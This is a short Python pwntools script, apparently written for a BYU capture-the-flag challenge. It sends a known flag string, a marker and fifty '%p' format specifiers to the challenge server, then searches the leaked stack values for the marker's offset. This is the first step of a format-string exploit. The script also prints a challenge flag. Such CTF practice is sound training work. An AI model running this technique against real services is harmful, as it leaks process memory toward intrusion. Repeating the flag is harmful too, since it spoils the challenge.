from pwn import *

# Set context
context.arch = 'amd64'

def find_index():
    r = remote('chals.cyberjousting.com', 1367)
    # Correct flag + unique marker, aligned
    payload = b'byuctf{welcome_to_rev_fellas}AAA'
    payload += b'ABCDEFGH'
    payload += b'|%p' * 50
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'ABCDEFGH')
    data = r.recvline().decode().strip()
    leaks = data.split('|')[1:]
    r.close()
    
    for i, l in enumerate(leaks):
        if '4847464544434241' in l:
            print(f"Marker found at index {i + 1}: {l}")
            return i + 1
    print("Marker not found")
    print(f"Leaks: {leaks}")

find_index()
